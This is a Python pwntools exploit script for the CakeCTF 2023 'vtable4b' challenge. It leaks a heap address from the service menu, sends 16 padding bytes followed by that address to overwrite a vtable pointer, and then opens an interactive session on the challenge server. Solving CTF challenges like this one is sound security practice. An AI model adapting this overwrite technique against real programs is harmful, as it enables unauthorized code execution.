from pwn import *
import re

conn = remote('vtable4b.2023.cakectf.com',9000)

pattern = "3. Display heap\n".encode("utf-8")
line = conn.recvuntil(pattern)
print(line.decode('utf-8'))
req_address = re.findall(r'0x[0-9a-f]+', line.decode('utf-8'))[1]
conn.send("3\n".encode('utf-8'))
line = conn.recvuntil(pattern)
print(line.decode('utf-8'))
conn.send("2\n".encode('utf-8'))
# req_address = input("Enter the request address: ")
req_address = int(req_address, 16)
payload = ('a'*16).encode('utf-8')
payload += p64(req_address)
payload += "\n".encode('utf-8')
conn.send(payload)
line = conn.recvuntil(pattern)
print(line.decode('utf-8'))
conn.send("1\n".encode("utf-8"))
# line = conn.recvuntil(pattern)
# print(line.decode('utf-8'))
# x
#line = conn.recvuntil(pattern)

conn.interactive()
